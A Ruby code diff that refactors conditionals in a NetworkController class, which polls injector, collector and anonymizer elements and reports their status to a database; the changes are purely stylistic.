@@ -37,13 +37,13 @@ class NetworkController
     # keep only the elements to be polled
     elements.delete_if {|x| x['poll'] == false}
 
-    if not elements.empty? then
+    if elements.empty?
+      # send the status to the db
+      send_status "Idle..."
+    else
       trace :info, "[NC] Handling #{elements.length} network elements..."
       # send the status to the db
       send_status "Handling #{elements.length} network elements..."
-    else
-      # send the status to the db
-      send_status "Idle..."
     end
 
     # contact every element
@@ -139,7 +139,7 @@ class NetworkController
 
         when NCProto::PROTO_CONF
           content = nil
-          if not element['configured']
+          unless element['configured']
             content = DB.instance.injector_config(element['_id']) if element['type'].nil?
             content = DB.instance.collector_config(element['_id']) unless element['type'].nil?
             trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)" unless content.nil?
@@ -223,7 +223,7 @@ class NetworkController
 
   def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0, version=0)
 
-    if elem['type'] == 'remote' then
+    if elem['type'] == 'remote'
       component = "RCS::ANON::" + elem['name']
       internal_component = 'anonymizer'
     else
